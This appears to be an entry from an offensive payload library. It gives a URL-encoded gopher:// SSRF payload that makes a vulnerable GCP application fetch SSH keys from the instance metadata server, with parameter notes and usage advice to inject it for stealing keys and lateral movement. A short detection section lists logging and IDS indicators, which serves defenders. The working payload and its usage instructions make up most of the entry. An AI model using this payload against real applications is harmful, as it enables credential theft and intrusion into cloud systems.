---
type: code
language: text
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - GCP
tags:
  - ssrf
  - gopher
  - payload
  - metadata
validated: true
---

# gopher-ssrf-payload-for-ssh-keys-retrieval

## Code

```powershell
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

## Description

This code snippet is a Gopher protocol payload designed to exploit SSRF in GCP applications by encoding an HTTP GET request to retrieve SSH keys from the instance metadata server. It includes the necessary Metadata-Flavor: Google header to authenticate the request, allowing access to protected endpoints.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| metadata.google.internal | Internal hostname of the GCP metadata server | metadata.google.internal |
| /computeMetadata/v1/instance/attributes/ssh-keys | Path to SSH keys attribute | /computeMetadata/v1/instance/attributes/ssh-keys |
| Metadata-Flavor:%20Google | Required header for metadata access | Metadata-Flavor: Google |

## Usage

Inject this payload into an SSRF-vulnerable parameter in a GCP application (e.g., a URL fetcher or image loader). The application will interpret the Gopher URL and forward the embedded HTTP request to the metadata server. Use in red team scenarios to steal SSH keys for lateral movement; test with tools like curl or Burp Suite by URL-encoding if the parameter requires it.

## Detection

- Monitor application logs for Gopher protocol usage or requests to internal metadata endpoints (169.254.169.254, metadata.google.internal).
- Enable GCP Cloud Audit Logs to track metadata API calls from unexpected sources.
- Network intrusion detection systems (IDS) can flag anomalous internal HTTP traffic or URL-encoded payloads containing %0A (newline) and header patterns like Metadata-Flavor.
- Application-level logging for SSRF indicators, such as fetches to localhost or cloud metadata IPs.

## Related

- [[procedures/google-cloud-ssrf-metadata-retrieval]]
- [[tools/Burp-Suite]]
